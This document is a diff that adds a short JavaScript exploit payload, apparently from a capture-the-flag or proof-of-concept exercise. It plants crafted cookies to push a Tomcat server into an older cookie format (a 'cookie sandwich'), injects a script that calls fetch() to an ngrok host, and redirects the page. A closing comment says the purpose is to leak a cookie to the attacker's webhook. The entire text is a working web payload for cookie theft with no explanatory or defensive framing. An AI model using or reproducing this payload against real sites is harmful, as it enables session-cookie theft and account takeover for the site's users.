@@ -1,0 +1,8 @@
+<script>
+    document.cookie="$Version=1;path=/index.jsp";
+    document.cookie=`language="><body><script>fetch('http://0.tcp.eu.ngrok.io:10810/?'+';path=/index.jsp`;
+    document.cookie=`lang=')</body><`+`/script>";path=/`
+
+    window.location="/index.jsp"
+
+</script>   //downgrade tomcat server to older cookie rfc to do cookie sandwich and leak cookie to our webhook
